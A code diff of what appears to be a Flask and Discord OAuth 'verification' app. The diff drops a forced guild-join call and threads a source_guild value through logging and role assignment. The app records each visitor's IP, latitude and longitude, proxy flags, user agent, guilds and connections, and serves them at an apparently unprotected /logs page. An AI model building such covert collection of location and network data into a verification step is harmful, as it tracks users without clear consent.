@@ -13,15 +13,12 @@ ACCESS_LOG_FILE = "access_log.json"
 DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
 DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
-DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
 REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
-
 
 def get_client_ip():
     if "X-Forwarded-For" in request.headers:
         return request.headers["X-Forwarded-For"].split(",")[0].strip()
     return request.remote_addr
-
 
 def get_geo_info(ip):
     try:
@@ -49,7 +46,6 @@ def get_geo_info(ip):
             "lat": None, "lon": None, "proxy": False, "hosting": False
         }
 
-
 def save_log(discord_id, data):
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     if os.path.exists(ACCESS_LOG_FILE):
@@ -64,7 +60,6 @@ def save_log(discord_id, data):
     with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
         json.dump(logs, f, indent=4, ensure_ascii=False)
 
-
 @app.route("/")
 def index():
     source_guild = request.args.get("source_guild", "不明")
@@ -74,7 +69,6 @@ def index():
         f"&state={source_guild}"
     )
     return render_template("index.html", discord_auth_url=discord_auth_url)
-
 
 @app.route("/callback")
 def callback():
@@ -110,15 +104,6 @@ def callback():
     guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
     connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()
 
-    requests.put(
-        f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
-        headers={
-            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
-            "Content-Type": "application/json"
-        },
-        json={"access_token": access_token}
-    )
-
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
         ip = requests.get("https://api.ipify.org").text
@@ -127,9 +112,12 @@ def callback():
     ua_raw = request.headers.get("User-Agent", "不明")
     ua = parse(ua_raw)
 
-    avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"
+    avatar_url = (
+        f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024"
+        if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"
+    )
 
-    bot_guild_ids = [DISCORD_GUILD_ID]
+    bot_guild_ids = []  # 任意。必要なら設定
     joined_guilds = [g["name"] for g in guilds if g["id"] in bot_guild_ids]
 
     data = {
@@ -192,21 +180,21 @@ def callback():
                 {"name": "経度", "value": str(data["lon"]), "inline": True}
             ]
         }
-        bot.loop.create_task(bot.send_log(embed=embed_data))
+        bot.loop.create_task(bot.send_log(embed=embed_data, source_guild=source_guild))
 
         if data["proxy"] or data["hosting"]:
             bot.loop.create_task(bot.send_log(
                 f"⚠️ **不審なアクセス検出**\n"
                 f"{data['username']}#{data['discriminator']} (ID: {data['id']})\n"
-                f"IP: {data['ip']} / Proxy: {data['proxy']} / Hosting: {data['hosting']}"
+                f"IP: {data['ip']} / Proxy: {data['proxy']} / Hosting: {data['hosting']}",
+                source_guild=source_guild
             ))
 
-        bot.loop.create_task(bot.assign_role(user["id"]))
+        bot.loop.create_task(bot.assign_role(user["id"], source_guild=source_guild))
     except Exception as e:
         print("Embed送信エラー:", e)
 
     return render_template("welcome.html", username=data["username"], discriminator=data["discriminator"])
-
 
 @app.route("/logs")
 def show_logs():
@@ -217,10 +205,8 @@ def show_logs():
         logs = {}
     return render_template("logs.html", logs=logs)
 
-
 def run_bot():
     bot.run(DISCORD_BOT_TOKEN)
-
 
 if __name__ == "__main__":
     threading.Thread(target=run_bot, daemon=True).start()
